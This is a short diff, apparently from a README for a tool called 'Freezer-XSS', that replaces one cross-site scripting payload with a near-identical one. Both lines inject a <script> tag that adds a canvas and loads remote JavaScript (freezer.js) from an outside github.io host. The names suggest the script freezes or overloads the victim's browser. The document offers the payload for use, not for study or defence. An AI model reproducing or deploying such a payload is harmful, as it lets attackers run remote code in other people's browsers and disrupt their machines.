@@ -14,4 +14,4 @@ https://github.com/user-attachments/assets/e35d05a5-1d54-42a2-89e8-511a6380acd5
 
 ------------------------------------------
 
-```<script>var c=document.createElement('canvas');c.id='cpuCanvas';document.body.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/Freezer-XSS/freezer.js';document.body.appendChild(r);</script>```
+```<script>var c=document.createElement('canvas');c.id='cpuCanvas';document.body.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/XSS-Freezer/freezer.js';document.body.appendChild(r);</script>```
